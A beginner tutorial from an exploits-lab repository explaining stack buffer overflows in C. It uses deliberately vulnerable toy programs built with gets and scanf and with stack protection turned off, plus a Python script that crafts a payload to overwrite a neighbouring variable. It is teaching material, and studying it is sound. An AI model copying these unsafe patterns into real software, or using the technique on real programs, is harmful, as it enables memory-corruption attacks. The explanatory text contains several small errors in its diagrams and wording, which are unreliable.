# EXPLOITS
## Stack Buffer overflow
## REQUIRED TO UNDERTSTAND : [How does the memory's stack works  ](https://github.com/TheCrazzXz/Exploits-Lab/blob/main/App-sys/how-do-i/Explaination/Memory-stack-explaination.md)

The stack buffer overflow is a vulnerability that we can exploit on a program where we can overwrite data on the stack which is outside an array  
For example, let's say you have two arrays :
```c
int main(void)
{
	char arr1[4]
	char arr2[4];
}

```
**/!\\ MAKE SURE TO USE `gcc <source.c> -o <executable> -fno-stack-protector` /!\\**  
These will be placed on the stack :  
The stack :
```
...

arr2   |  | ADDRESS x-7
arr2+1 |  | ADDRESS x-6
arr2+2 |  | ADDRESS x-5
arr2+3 |  | ADDRESS x-4
arr1   |  | ADDRESS x-3
arr1+1 |  | ADDRESS x-2
arr1+2 |  | ADDRESS x-1
arr1+3 |  | ADDRESS x
...
```
We know we can access elements of arrays such as `arr1[0]`, `arr1[2]` or `arr2[3]`...  
Now you might know that `array/pointer[index]` = `array/pointer+index`  
So here's the thing :  
`arr2[0]` = `arr2+0` = `arr2` = `ADDRESS x-7`  
`arr2[1]` = `arr2+1` = `ADDRESS x-6`
`arr2[2]` = `arr2+2` = `ADDRESS x-5`
`arr2[3]` = `arr2+3` = `ADDRESS x-4`
And now...
`arr2[4]` = `arr2+4` = ... `ADDRESS x-3` !!!  
By accessing `arr2[4]` which is out of bound we actually access `ADDRESS x-3` so we access `arr1` !  
So :
`arr2[4]` = `arr1[0]` = `ADDRESS x-3`  
`arr2[5]` = `arr1[1]` = `ADDRESS x-2`  
`arr2[6]` = `arr1[2]` = `ADDRESS x-1`  
`arr2[7]` = `arr1[3]` = `ADDRESS x`  
And this is what is the buffer overflow  
Let's say we have :
```c
#include <stdio.h>
#include <string.h>

int main(void)
{
	char arr1[] = "AAAA"; // allocates 5 bytes ("AAAA\x00")
	char arr2[] = "BBBB";// allocates 5 bytes ("BBBB\x00")
	
	printf("arr1 : %s\n", arr1);
	printf("arr2 : %s\n", arr2);
	
	arr2[5] = 'X';
	
	printf("arr1 : %s\n", arr1);
	printf("arr2 : %s\n", arr2);
}
```
**/!\\ MAKE SURE TO USE `gcc <source.c> -o <executable> -fno-stack-protector` /!\\**  
The stack looks like this before the overflow :
```
...
arr2   |'B' | ADDRESS x-9
arr2+1 |'B' | ADDRESS x-8
arr2+2 |'B' | ADDRESS x-7
arr2+3 |'B' | ADDRESS x-6
arr2+4 |0x00| ADDRESS x-5

arr1   |'A' | ADDRESS x-4
arr1+1 |'A' | ADDRESS x-3
arr1+2 |'A' | ADDRESS x-2
arr1+3 |'B' | ADDRESS x-1
arr1+4 |0x00| ADDRESS x-0
...
```
Strings in C are NULL-Terminated so each array is actually 5 bytes because it allocates 1 more byte which is `0x00`
And it prints :
```
arr1 : AAAA
arr2 : BBBB
```
Now after the overflow :
```
...
arr2   |'B' | ADDRESS x-9
arr2+1 |'B' | ADDRESS x-8
arr2+2 |'B' | ADDRESS x-7
arr2+3 |'B' | ADDRESS x-6
arr2+4 |0x00| ADDRESS x-5

arr1   |'X' | ADDRESS x-4 <= arr2[5]
arr1+1 |'A' | ADDRESS x-3
arr1+2 |'A' | ADDRESS x-2
arr1+3 |'B' | ADDRESS x-1
arr1+4 |0x00| ADDRESS x-0
...
```
So we could change the `arr1[0]` which is `arr2[5]` without even accessing `arr1[0]`  
And this is the main idea of buffer overflow and stack buffer overflows  
In C there are functions that are vulnerable to buffer overflows, such as :

- scanf
- gets
- sprintf
- strcpy
- ...

So let's take the example of `scanf` :
```c
#include <stdio.h>
#include <string.h>

int main(void)
{
	char arr1[] = "AAAA";
	char arr2[] = "BBBB";
	
	printf("arr1 : %s\n", arr1);
	printf("arr2 : %s\n", arr2);
	
	scanf("%s", arr2);
	
	printf("arr1 : %s\n", arr1);
	printf("arr2 : %s\n", arr2);
}
```
**/!\\ MAKE SURE TO USE `gcc <source.c> -o <executable> -fno-stack-protector` /!\\**  
The way we overflow it is that we enter 5 characters to fill the `arr2` buffer then the other bytes are gonna overflow it and then modify `arr2` :  
So we enter :
```
AAAAAXXXX
```
Now `arr2` is overflown and `arr2` were overwritten with `XXXX` :
```
arr1 : AAAA
arr2 : BBBB
AAAAAXXXX
arr1 : XXXX
arr2 : AAAAAXXXX
```
So now `arr1` is overwritten with `XXXX` !  
And we can overwrite any variable which is placed after under the buffer in the stack, so which is declared and initialized before the buffer we overflow  
We can also overflow multiple variables :
```c
#include <stdio.h>
#include <string.h>

int main(void)
{
	char arr0[] = "CCCC";
	char arr1[] = "AAAA";
	char arr2[] = "BBBB";
	
	printf("arr0 : %s\n", arr0);
	printf("arr1 : %s\n", arr1);
	printf("arr2 : %s\n", arr2);
	
	scanf("%s", arr2);
	
	printf("arr0 : %s\n", arr0);
	printf("arr1 : %s\n", arr1);
	printf("arr2 : %s\n", arr2);
}
```
**/!\\ MAKE SURE TO USE `gcc <source.c> -o <executable> -fno-stack-protector` /!\\**  

If we enter :
```
XXXXXYYYYYZZZZZ
```
So arr2 will be : `XXXXXYYYYYZZZZZ` because gets places the NULL terminator just after our input  
arr1 will be : `YYYYYZZZZZ`  
and arr3 will be `ZZZZZ`  
```
arr0 : CCCC
arr1 : AAAA
arr2 : BBBB
XXXXXYYYYYZZZZZ
arr0 : ZZZZZ
arr1 : YYYYYZZZZZ
arr2 : XXXXXYYYYYZZZZZ
```
If you want to use characters that you can't type with your keyboard, such as null bytes or things like that, you can use a program that writes the input you want to use to a file and then redirect stdin to this file, for example :
```c
#include <stdio.h>
#include <string.h>

int main(void)
{
	printf("Try to change data to 1337\n");
	
	int data = 10;
	char buffer[16];
	
	gets(buffer);

	printf("data : %d\n", data);
	if(data == 1337)
	{
		printf("Good job");
	}
	else
	{
		printf("Nope");
	}
}
```
**/!\\ MAKE SURE TO USE `gcc <source.c> -o <executable> -fno-stack-protector` /!\\**  

The goal is to overwrite the `data` variable with the number `1337`, data is an integer so `4` bytes  
Note that we reserved exactly 16 bytes not a NULL terminator in addition to them  
In the stack, we have :
```
16 bytes buffer
data  |0x0a|
data+1|0x00|
data+2|0x00|
data+3|0x00|
```
So as you can see each byte of data number is stored (in reverse order), we want data to be `1337` which is `0x539` in hexadecimal so we want data to be : `0x00000539`, which in memory is stored : `0x39, 0x05, 0x00, 0x00`  
So let's use for example pyth0n to create what we call a payload, it's simply a word for saying data we want to send to program :
```py
file = open("payload", "wb")

payload = "A"*16 # 16 bytes to fill the buffer
```
So then comes the variable `data`, we want it to be `1337` = `0x00000539`, so since we're in little endian we'll set every byte of the number in reverse, so first the `0x39`, then the `0x05`...  
So we have : `'A'*16` then `0x39` then `0x05` then `0x00` and then `0x00` :  
```py
file = open("payload", "wb")

payload = "A"*16 # 16 bytes to fill the buffer
payload += "\x39\x05\x00\x00"
```
We can do this or we can also use the `pack` function from the the struct module, it converts an integer, so here it's : `0x00000539` to little endian data so `\x39\x05\x00\x00` :
```py
import struct

file = open("payload", "wb")

payload = "A"*16 # 16 bytes to fill the buffer
payload += struct.pack("I", 0x00000539) # I means that it's a 32 bits (4 bytes) integer
```
Then we write to the file :
```
import struct

file = open("payload", "wb")

payload = b"A"*16 # 16 bytes to fill the buffer
payload += struct.pack("I", 0x00000539) # I means that it's a 32 bits (4 bytes) integer

file.write(payload)
file.close()
```
Now we launch the script and we have the payload file  
To redirect stdin to the content of the file we can do :
```
<executable we're exploiting> < <payload file>
```
Example :
```
./prog < payload
```
Now we get :
```
Try to change data to 1337
data : 1337
Good job
```
And that's awesome  
Thanks for reading  
### Next Article
You should now take a look at my other article about Code Execution Redirection with Stack Buffer Overflows : https://github.com/TheCrazzXz/Exploits-Lab/blob/main/App-sys/how-do-i/Explt/Stack-buffer-overflow/Stack-buffer-overflow-control-flow-redirection.md.md
